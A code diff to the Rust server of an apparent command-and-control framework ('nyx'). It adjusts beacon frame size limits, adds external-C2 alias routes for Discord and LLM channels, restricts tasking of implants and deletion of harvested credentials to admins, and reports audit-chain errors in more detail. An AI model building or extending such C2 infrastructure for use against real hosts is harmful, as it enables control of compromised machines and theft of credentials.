@@ -31,12 +31,14 @@ pub const MAX_RESULTS_PER_SESSION: usize = 4096;
 pub const MAX_SESSIONS: usize = 4096;
 /// Per-request body cap on the beacon endpoint (and any profile-declared beacon
 /// URIs). A beacon body is exactly ONE encrypted frame — `[32 pubkey][8 counter]
-/// [4 ct_len][ct ≤ 256 KiB (the protocol's MAX_CT_LEN)][16 tag]` — so the real
-/// ceiling is ~256 KiB + header. 512 KiB is generous while staying ~8× under the
-/// 4 MiB cap on the operator API routes, so an unauthenticated flood against
-/// `/beacon` (check-in is crypto-gated, not token-gated, by design) can't buffer
-/// the full API allowance per hit.
-pub const BEACON_BODY_LIMIT: usize = 512 * 1024;
+/// [4 ct_len][ct ≤ MAX_CT_LEN = 512 KiB][16 tag]` — so the real ceiling is
+/// `FRAME_HEADER + MAX_CT_LEN + TAG_LEN` = 524,348 B. This limit is that ceiling
+/// plus 4 KiB of slack: a maximum-size (near-ceiling) frame is NEVER rejected by
+/// the body limit, while the total (~516 KiB) stays well under the 4 MiB cap on
+/// the operator API routes — an unauthenticated flood against `/beacon`
+/// (check-in is crypto-gated, not token-gated, by design) still can't buffer the
+/// full API allowance per hit.
+pub const BEACON_BODY_LIMIT: usize = FRAME_HEADER + MAX_CT_LEN + TAG_LEN + 4 * 1024;
 
 use axum::{
     body::Bytes,
@@ -49,8 +51,12 @@ use axum::{
 use dashmap::mapref::entry::Entry;
 use dashmap::DashMap;
 use nyx_protocol::{
-    encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction, FileOp,
-    Response as MsgResponse, ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
+    encode_frame_dir,
+    frame::{FRAME_HEADER, MAX_CT_LEN},
+    open_frame_dir, parse_frame,
+    wire::Reader,
+    Command, Direction, FileOp, Response as MsgResponse, ServerKeypair, SessionInfo, SessionKey,
+    Task, TaskResponse, TAG_LEN,
 };
 // REST view types — the server serializes these for /api/* responses. Using
 // nyx-rest as the single source of truth prevents field drift between the
@@ -724,10 +730,11 @@ pub fn spawn_session_gc(state: Arc<AppState>) {
                 });
                 if let Some((_, s)) = removed {
                     evicted_count += 1;
+                    let session_id = hex::encode(key);
                     let age = now.duration_since(s.created).as_secs();
                     let idle = now.duration_since(s.last_seen).as_secs();
                     tracing::info!(
-                        session = %hex::encode(key),
+                        session = %session_id,
                         host = %s.info.hostname,
                         user = %s.info.username,
                         age_secs = age,
@@ -735,12 +742,25 @@ pub fn spawn_session_gc(state: Arc<AppState>) {
                         pending = s.pending.len(),
                         "session evicted by GC"
                     );
+                    // Mirror the Command::Exit path in `post_task`: fire
+                    // SessionExit so operator hooks (`on_session_exit`) run
+                    // when GC evicts a session too. Previously the event was
+                    // only produced on an explicit Exit task, leaving the hook
+                    // dead for evicted (idle/aged-out) sessions. Fired AFTER
+                    // `remove_if` drops the shard write lock — the same
+                    // liveness discipline `handle_beacon` uses — so a slow
+                    // operator script can't block this session's DashMap shard.
+                    state.events.fire(&nyx_scripting::Event::SessionExit(
+                        nyx_scripting::SessionExit {
+                            session_id: session_id.clone(),
+                        },
+                    ));
                     // Drop the persisted row too so the store doesn't accumulate
                     // dead sessions forever (the next boot would otherwise
                     // restore a session the runtime just evicted). Fire-and-
                     // forget: the background writer applies it asynchronously.
                     if let Some(persist) = &state.sessions_db {
-                        persist.delete(hex::encode(key));
+                        persist.delete(session_id);
                     }
                 }
             }
@@ -800,8 +820,9 @@ pub fn router(state: Arc<AppState>) -> Router {
         .unwrap_or_default();
 
     // Beacon routes (unauthenticated, crypto-gated). A beacon POST carries
-    // exactly ONE encrypted frame (≤ ~256 KiB: MAX_CT_LEN + header + tag), so
-    // BEACON_BODY_LIMIT (512 KiB) is generous. Keeping it well under the API
+    // exactly ONE encrypted frame (≤ FRAME_HEADER + MAX_CT_LEN + TAG_LEN ≈ 516
+    // KiB), so BEACON_BODY_LIMIT — the frame ceiling plus 4 KiB of slack —
+    // admits every encodable frame. Keeping it well under the API
     // limit bounds the pre-auth buffering an attacker can trigger per /beacon
     // connection (check-in is crypto-gated, not token-gated, by design).
     // The native DNS beacon (spec-4) POSTs its frame to `/dns` with an
@@ -818,8 +839,10 @@ pub fn router(state: Arc<AppState>) -> Router {
     // operator has configured `NYX_EXTC2_*`). That makes the server an actual
     // external-C2 relay rather than just a URI alias for `/beacon`.
     //
-    // **Discord** and **LLM** still delegate to the plain `beacon` handler
-    // pending their own relay wiring (see design notes in `extc2_relay.rs`).
+    // **Discord** and **LLM** still delegate to the beacon path via
+    // [`extc2_alias_handler`], which logs a WARN so operators can see these
+    // plain-beacon aliases being used — there is no real third-party relay
+    // behind them yet (see design notes in `extc2_relay.rs`).
     //
     // `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
     // the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
@@ -830,8 +853,8 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/doh", post(beacon))
         .route("/dns", post(beacon))
         .route("/extc2/slack", post(extc2_relay_handler_slack))
-        .route("/extc2/discord", post(beacon))
-        .route("/extc2/llm", post(beacon))
+        .route("/extc2/discord", post(extc2_alias_handler))
+        .route("/extc2/llm", post(extc2_alias_handler))
         .route("/extc2/mcp", post(extc2_relay_handler_mcp));
     let mut seen = std::collections::HashSet::new();
     for (uri, is_post) in extra {
@@ -941,6 +964,37 @@ async fn extc2_relay_handler_slack(
         }
         Err(e) => {
             tracing::warn!(error = %e, "extc2/slack beacon handler error");
+            StatusCode::BAD_REQUEST.into_response()
+        }
+    }
+}
+
+/// External-C2 plain-beacon alias handler for the Discord / LLM routes.
+///
+/// These two services have NO third-party relay wired yet (see the design
+/// notes at the bottom of `extc2_relay.rs`), so `/extc2/discord` and
+/// `/extc2/llm` behave exactly like `/beacon`: decrypt → queue results → seal
+/// reply. That is indistinguishable from `/beacon` on the wire, so this
+/// handler logs a WARN on every use — an operator relying on Discord/LLM
+/// egress should SEE that the traffic is actually landing on the plain beacon
+/// endpoint (and that no third-party fan-out is happening) instead of
+/// believing the frame reached Discord/LLM.
+async fn extc2_alias_handler(
+    State(st): State<Arc<AppState>>,
+    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
+    method: Method,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    tracing::warn!(
+        target: "nyx::extc2",
+        %peer,
+        "extc2 alias route used — no third-party relay behind this channel; processing as plain /beacon"
+    );
+    match handle_beacon(&st, &peer, &method, &headers, &body) {
+        Ok(frame) => shape_beacon_response(&st, frame),
+        Err(e) => {
+            tracing::warn!(error = %e, "extc2 alias beacon handler error");
             StatusCode::BAD_REQUEST.into_response()
         }
     }
@@ -1769,7 +1823,7 @@ fn handle_frame(
     // missing/raced session entry — hence the clean error paths, no `.expect()`.)
     let (is_new, key) = resolve_session_key(st, raw)?;
 
-    let plaintext = open_frame(&key, raw).map_err(|_| {
+    let plaintext = open_frame_dir(&key, Direction::ClientToServer, raw).map_err(|_| {
         // The overwhelmingly common cause of a tag mismatch here is key
         // desynchronization: the implant performed ECDH against a server_pub
         // that differs from this server's current long-term identity (stale
@@ -2178,12 +2232,27 @@ async fn post_task(
         AuthOutcome::Allowed(o) => o,
         AuthOutcome::Denied(r) => return r,
     };
-    if op.role == operators::Role::Viewer {
-        return (
-            StatusCode::FORBIDDEN,
-            "forbidden: viewer role cannot task beacons",
-        )
-            .into_response();
+    // RBAC deny-list: tasking delivers destructive commands (shell, inject,
+    // file ops, …) to beacons, so it is Admin-only. Viewer (read-only) and
+    // Operator (no active tasking) are both denied — the Operator tier is
+    // admin-equivalent EXCEPT for these destructive endpoints (see the `Role`
+    // enum in `operators.rs`).
+    match op.role {
+        operators::Role::Admin => {}
+        operators::Role::Operator => {
+            return (
+                StatusCode::FORBIDDEN,
+                "forbidden: operator role cannot task beacons (destructive command delivery is admin-only)",
+            )
+                .into_response();
+        }
+        operators::Role::Viewer => {
+            return (
+                StatusCode::FORBIDDEN,
+                "forbidden: viewer role cannot task beacons",
+            )
+                .into_response();
+        }
     }
     let id = match parse_session_hex(&req.session) {
         Some(id) => id,
@@ -2526,12 +2595,25 @@ async fn delete_cred(
         AuthOutcome::Allowed(o) => o,
         AuthOutcome::Denied(r) => return r,
     };
-    if op.role == operators::Role::Viewer {
-        return (
-            StatusCode::FORBIDDEN,
-            "forbidden: viewer role cannot delete credentials",
-        )
-            .into_response();
+    // RBAC deny-list: credential deletion is destructive (destroys harvested
+    // secrets), so it is Admin-only like tasking (see the `Role` enum in
+    // `operators.rs`).
+    match op.role {
+        operators::Role::Admin => {}
+        operators::Role::Operator => {
+            return (
+                StatusCode::FORBIDDEN,
+                "forbidden: operator role cannot delete credentials (destructive; admin-only)",
+            )
+                .into_response();
+        }
+        operators::Role::Viewer => {
+            return (
+                StatusCode::FORBIDDEN,
+                "forbidden: viewer role cannot delete credentials",
+            )
+                .into_response();
+        }
     }
     let kind = match nyx_store::CredKind::from_label(&key.kind) {
         Some(k) => k,
@@ -2588,7 +2670,9 @@ async fn get_audit(
     }
 }
 
-/// `GET /api/audit/verify` — walk the hash-chain. `{ "ok": bool, "broken_at": Option<u64> }`.
+/// `GET /api/audit/verify` — walk the hash-chain. `{ "ok": bool,
+/// "broken_at": Option<u64>, "reason"?: str, "line"?: usize }` —
+/// `reason`/`line` are set for the malformed-line and truncated cases.
 async fn verify_audit(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
     let op = match authenticate(&st, &headers) {
         AuthOutcome::Allowed(o) => o,
@@ -2604,17 +2688,43 @@ async fn verify_audit(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Re
     let Some(audit) = &st.audit else {
         return (StatusCode::OK, Json(serde_json::json!({ "ok": true }))).into_response();
     };
-    let broken = match audit::AuditWriter::verify_chain(audit.path()) {
-        Ok(b) => b,
-        Err(e) => {
-            return (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response()
+    match audit::AuditWriter::verify_chain(audit.path()) {
+        Ok(true) => (
+            StatusCode::OK,
+            Json(serde_json::json!({ "ok": true, "broken_at": serde_json::Value::Null })),
+        )
+            .into_response(),
+        // Ok(false) is unreachable — verify_chain returns Err for every
+        // non-clean outcome — but the arm keeps the match total.
+        Ok(false) => (
+            StatusCode::OK,
+            Json(serde_json::json!({ "ok": false, "broken_at": serde_json::Value::Null })),
+        )
+            .into_response(),
+        Err(audit::VerifyError::Io(e)) => {
+            (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response()
         }
-    };
-    (
-        StatusCode::OK,
-        Json(serde_json::json!({ "ok": broken.is_none(), "broken_at": broken })),
-    )
-        .into_response()
+        Err(audit::VerifyError::ChainBreak { seq }) => (
+            StatusCode::OK,
+            Json(serde_json::json!({ "ok": false, "broken_at": seq })),
+        )
+            .into_response(),
+        Err(audit::VerifyError::MalformedLine { line }) => (
+            StatusCode::OK,
+            Json(serde_json::json!({
+                "ok": false, "broken_at": 0, "reason": "malformed line", "line": line
+            })),
+        )
+            .into_response(),
+        Err(audit::VerifyError::Truncated { line }) => (
+            StatusCode::OK,
+            Json(serde_json::json!({
+                "ok": false, "broken_at": serde_json::Value::Null,
+                "reason": "verification truncated (MAX_VERIFY_LINES)", "line": line
+            })),
+        )
+            .into_response(),
+    }
 }
 
 /// Lowercase label for a [`FileOp`] (for the audit log's `op` field).
